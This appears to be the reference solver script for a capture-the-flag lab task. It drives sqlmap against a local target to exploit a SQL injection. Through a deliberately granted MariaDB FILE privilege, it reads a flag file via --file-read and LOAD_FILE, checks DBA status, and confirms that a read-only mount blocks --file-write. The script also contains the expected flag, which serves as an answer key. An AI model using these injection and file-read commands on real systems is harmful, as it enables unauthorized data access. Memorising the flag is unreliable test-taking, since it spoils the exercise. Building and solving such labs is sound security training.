#!/usr/bin/env bash
# solvers/p2_8.sh: Task 2.8 "The Groundskeeper's Keys" canonical exploit.
#
# The same ordinary sink shape as every earlier floor (bare, unquoted
# numeric `id`). There is no hidden table in this floor's own database at
# all, nothing to --search or --dump here. This floor's DB user is instead
# deliberately over-privileged with the global FILE grant (see
# seed/mariadb/19_keys.sql), so the same injection point that would
# otherwise only ever reach three boring rows can read a file straight off
# the container's filesystem, no hidden table required.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{file_privilege_has_no_walls}"
TARGET="${BASE}/p2/keys?id=1"
FLAGFILE="/var/lib/mysql-files/groundskeeper.flag"

WORKDIR=$(mktemp -d)
LOG="${WORKDIR}/sqlmap.log"
trap 'rm -rf "$WORKDIR"' EXIT

# --- Step 1: read the file straight off the DBMS's filesystem --------------
echo "[p2_8] step 1: sqlmap --file-read=\"${FLAGFILE}\""
sqlmap -u "$TARGET" -p id --batch --ignore-stdin \
    --file-read="$FLAGFILE" --output-dir="${WORKDIR}/read" \
    2>&1 | tee "${LOG}.read" >/dev/null
SAVED=$(find "${WORKDIR}/read" -type f -iname "*groundskeeper.flag*" 2>/dev/null | head -1)
if [[ -n "$SAVED" ]] && grep -qF "$FLAG" "$SAVED"; then
    echo "  ok: --file-read recovered the flag from ${FLAGFILE}: ${FLAG}"
else
    echo "[p2_8] FAIL: --file-read did not recover the expected flag"
    exit 1
fi

# --- Step 2: the same file, through --sql-shell instead ---------------------
echo "[p2_8] step 2: sqlmap --sql-shell, SELECT LOAD_FILE('${FLAGFILE}')"
SHELL_OUT=$(echo "SELECT LOAD_FILE('${FLAGFILE}');" | sqlmap -u "$TARGET" -p id \
    --batch --ignore-stdin --sql-shell 2>&1)
if echo "$SHELL_OUT" | grep -qF "$FLAG"; then
    echo "  ok: --sql-shell independently recovered the same flag"
else
    echo "[p2_8] FAIL: --sql-shell did not recover the expected flag"
    exit 1
fi

# --- Step 3: FILE does not widen table access or grant DBA rights ----------
echo "[p2_8] step 3: confirm FILE didn't also make this account a DBA"
DBA_OUT=$(sqlmap -u "$TARGET" -p id --batch --ignore-stdin --is-dba 2>&1)
if echo "$DBA_OUT" | grep -qi "is DBA: False"; then
    echo "  ok: current user is DBA: False, FILE alone is not superuser"
else
    echo "[p2_8] FAIL: expected 'is DBA: False'"
    exit 1
fi

# --- Step 4 (informational): the read-only mount blocks --file-write -------
# Not required for the flag; verifies a real safety boundary hasn't
# regressed. secure_file_priv permits writes to this directory at the SQL
# level, but the directory is bind-mounted read-only from the host, so
# MariaDB's own OS process can't write there either, a second, independent
# defensive layer on top of the GRANT.
echo "[p2_8] step 4 (informational): confirm --file-write is blocked by the read-only mount"
UPLOAD=$(mktemp)
echo "solver write probe" > "$UPLOAD"
WRITE_OUT=$(sqlmap -u "$TARGET" -p id --batch --ignore-stdin \
    --file-write="$UPLOAD" --file-dest="/var/lib/mysql-files/solver-probe.txt" 2>&1)
rm -f "$UPLOAD"
if echo "$WRITE_OUT" | grep -qi "has not been written"; then
    echo "  ok: --file-write correctly fails, read-only mount holds as a second defensive layer"
else
    echo "  note: --file-write did not fail as expected, the read-only mount may have regressed"
fi

echo "[p2_8] PASS"
exit 0
